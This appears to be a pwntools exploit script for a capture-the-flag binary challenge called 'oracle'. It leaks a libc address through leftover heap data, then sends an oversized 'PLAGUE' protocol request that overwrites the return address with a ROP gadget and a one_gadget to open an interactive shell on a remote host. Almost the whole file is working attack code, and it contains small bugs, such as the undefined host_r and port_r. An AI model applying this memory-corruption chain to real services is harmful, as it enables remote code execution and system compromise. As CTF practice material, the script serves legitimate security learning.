#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='amd64')
context.log_level = logging.DEBUG
context.terminal = ['tmux', 'splitw', '-h']
exe = './challenge/oracle_patched'
libc = ELF('./libc.so.6')

host = args.HOST or '94.237.61.21'
port = int(args.PORT or 35198)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
# b *parse_headers+269
# b *parse_headers+318
b *parse_headers+369
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

#io = start()
#io.recvline()

# leak libc
for i in range(2):
    r = remote(host, port)
    r.send(b'PLAGUE whoever version\r\n')
    r.send(b'Content-Length: 2048\r\n') # adapt
    # we want to have a chunk after the content chunk to prevent merging with top chun
    # at free
    r.send(b'Plague-Target: foo\r\n') # adapt
    r.send(b'\r\n')
    r.send(b'yo') # adapt
    r.send(b'\r\n\r\n')
    r.recvuntil(b'plague: ')
    if i == 0:
        r.recv(2048)
    else:
        r.recv(8)
        libc.address = u64(r.recv(8)) - 0x7f87637c3be0 + 0x7f87635d7000

    r.close()

info(f'libc address: {hex(libc.address)}')

# code exce
"""
0x000000000002f709 : pop r12 ; ret                                                                                                                                                                                                        
"""

one_gadget = 0xe3afe

r = remote(host_r, port_r)
r.send(b'PLAGUE whoever version\r\n')

p = fit({
    0x81f: p64(libc.address + 0x000000000002f709) + p64(0) + p64(libc.address + 0xe3afe) + b'\r\n\r\n',
})

# p = b'A'*(0x84e) + p8(0) + p64(libc.address + 0x000000000002f709) + p64(0)
# p += b'\r\n\r\n'

r.send(p)
#r.close()

r.interactive()

